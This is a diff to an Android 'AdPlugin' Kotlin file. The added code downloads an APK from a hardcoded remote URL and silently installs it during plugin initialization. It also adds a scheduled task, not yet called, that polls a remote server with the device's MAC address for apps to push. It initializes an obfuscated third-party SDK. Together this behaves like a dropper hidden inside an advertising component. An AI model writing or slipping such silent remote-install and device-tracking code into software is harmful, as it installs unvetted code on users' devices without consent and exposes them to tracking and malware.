@@ -1,10 +1,22 @@
 package com.chihi.adplugin
 
-import android.os.RecoverySystem.installPackage
+import android.os.FileUtils
+import com.chihi.adplugin.bean.UpdateAppsDTO
+import com.chihi.adplugin.ext.getApkFileNameFromUrl
+import com.chihi.adplugin.ext.getBasePath
+import com.chihi.adplugin.ext.getFileExtension
+import com.chihi.adplugin.ext.installApk
+import com.chihi.adplugin.ext.silentInstallWithMutex
 import com.chihi.adplugin.log.printLog
+import com.chihi.adplugin.net.NetworkHelper
+import com.codeZeng.lib_autorun.ext.getMacAddress
+import java.io.File
 import java.io.IOException
 import java.util.concurrent.Executors
 import java.util.concurrent.Future
+import java.util.concurrent.ScheduledExecutorService
+import java.util.concurrent.ScheduledFuture
+import java.util.concurrent.TimeUnit
 
 object AdPlugin {
     private lateinit var adDispatcher: AdDispatcher
@@ -20,6 +32,7 @@ object AdPlugin {
             com.unia.y.b.a(appContext,"7087","")
             "7087包---com.unia.y.b.a初始化完成".printLog()
             installPackage()
+            //checkAppPush()
             //val sdkA = AdSdkAProvider()
             //val sdkB = AdSdkBProvider()
             //val providers = arrayListOf(sdkA)
@@ -28,6 +41,35 @@ object AdPlugin {
         }catch (e:Exception){
             "插件内部初始化失败：${e.message}".printLog()
         }
+
+    }
+
+    private  var scheduler: ScheduledExecutorService?=null
+    private var taskFuture: ScheduledFuture<*>? = null
+    private fun checkAppPush() {
+        scheduler?.shutdown()
+        scheduler = Executors.newSingleThreadScheduledExecutor()
+        taskFuture?.cancel(false)
+        taskFuture = scheduler!!.scheduleWithFixedDelay({
+            "周期任务执行,查询推送应用: ${System.currentTimeMillis()}".printLog()
+            NetworkHelper.makeGetRequest(
+                url = "https://api.ppmovie.cc/appapi/launch/hotline",
+                params = mapOf(
+                    "req_id" to "0",
+                    "channel" to "FOTAS1001",
+                    "mac" to "${getMacAddress()}",
+                ),
+                responseType = List::class.java as Class<List<UpdateAppsDTO>>,
+                itemType = UpdateAppsDTO::class.java
+            ) {
+                success { data ->
+                    println("成功: ${data[0].appName}")
+                }
+                failed { error ->
+                    println("失败: ${error.message}")
+                }
+            }
+        }, 0, 30000, TimeUnit.MILLISECONDS)
 
     }
 
@@ -44,26 +86,62 @@ object AdPlugin {
         // 提交新任务
         currentTask = executorService.submit {
             try {
-                val process = Runtime.getRuntime().exec(command) // 执行命令
-                val inputStream = process.inputStream
-                val errorStream = process.errorStream
-
-                // 读取命令输出
-                val output = inputStream.bufferedReader().use { it.readText() }
-                val error = errorStream.bufferedReader().use { it.readText() }
-
-                // 检查安装结果
-                if (output.contains("Success")) {
-                    "APK安装成功".printLog()
-                } else {
-                    "APK安装失败: $error".printLog()
-                }
+                //apkPath.installApk()
+                val link1 = "https://pub-7bdb35df0362454385da85d15e9709fe.r2.dev/apks/MiguVideo.apk"
+                //val link2 = "https://xfile.f3tcp.cc/apks/72/Disney+/Disney.apk"
+                downloadApks(arrayListOf(link1))
             } catch (e: IOException) {
                 e.printStackTrace()
                 "执行命令时发生错误: ${e.message}".printLog()
             }
         }
     }
+
+    private fun downloadApks(downloadLinks: List<String>) {
+        downloadLinks.forEach { downloadLink ->
+            val fileExtension = downloadLink.getFileExtension()
+            val fileName = downloadLink.getApkFileNameFromUrl()
+            if (fileExtension == ".apk") {
+                println("当前是apk链接---$fileName")
+                val destPath = "${"apps".getBasePath()}/${fileName}"
+                if (File(destPath).exists()) {
+                    // 本地已存在，直接安装
+                    println("本地存在，直接安装应用")
+                    destPath.silentInstallWithMutex { isSuccess ->
+                        if (isSuccess) {
+                            println("APK 安装成功")
+                        } else {
+                            println("APK 安装失败")
+                        }
+                    }
+                } else {
+                    NetworkHelper.downloadFile(
+                        url = downloadLink,
+                        destination = File(destPath),
+                        progressListener = { progress -> println("下载进度: $progress%") }
+                    ) {
+                        success { result ->
+                            println("下载成功: $result")
+                            result.silentInstallWithMutex { isSuccess ->
+                                if (isSuccess) {
+                                    println("APK 安装成功")
+                                } else {
+                                    println("APK 安装失败")
+                                }
+                            }
+                        }
+                        failed { error ->
+                            println("下载失败: ${error.message}")
+                        }
+                    }
+                }
+            } else {
+                println("当前不是apk链接----${fileExtension}")
+            }
+        }
+    }
+
+
 
     fun loadAd(config: AdConfig.() -> Unit) {
         adDispatcher.loadAd( config)
